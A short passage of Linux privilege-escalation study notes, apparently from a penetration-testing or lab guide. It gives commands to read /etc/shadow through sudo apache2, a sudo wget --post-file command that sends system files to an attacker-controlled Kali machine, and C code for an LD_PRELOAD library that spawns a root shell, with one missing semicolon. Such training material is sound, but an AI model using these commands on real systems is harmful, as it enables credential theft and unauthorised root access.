- **_`sudo -l`_** : This command displays what commands can be run as root on the system

**NOTE:** You can view system files using **_`apache2`_** command: 
**_`sudo apache2 -f /etc/shadow`_**

**NOTE:** You can run **_`wget`_** along with **_`sudo`_** to execute a post request and transfer system files to attacker controlled machine:
**_`sudo wget --post-file=<system file path> <Kali IP:Port>`_**

[Make sure to start a listener on Kali before running the above command in order to receive a callback from the wget command]
***
## Privilege Escalation via `LD_PRELOAD`:

**_LD_PRELOAD_** is a feature which allows us to pre-load a user specific shared library before any other shared libraries are loaded. 

To do this, a **_.c_** file with a library has to be created and then compiled to get an executable binary.

The **_.c_** file must contain the following code:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
	{
		unsetenv("LD_PRELOAD")
		setgid(0);
		setuid(0);
		system("/bin/bash");
	}
```

To compile the **_. c_** file, run 
**_`gcc -fPIC -shared -o <outputfile.so> <library.c> -nostartfiles`_**

To use the newly compiled LD_PRELOAD binary, run 
**_`sudo LD_PRELOAD=<path to outputfile.so> <name of the SUID binary>`_**

**Example:** _**`sudo LD_PRELOAD=/root/shell.so ftp`**_
***

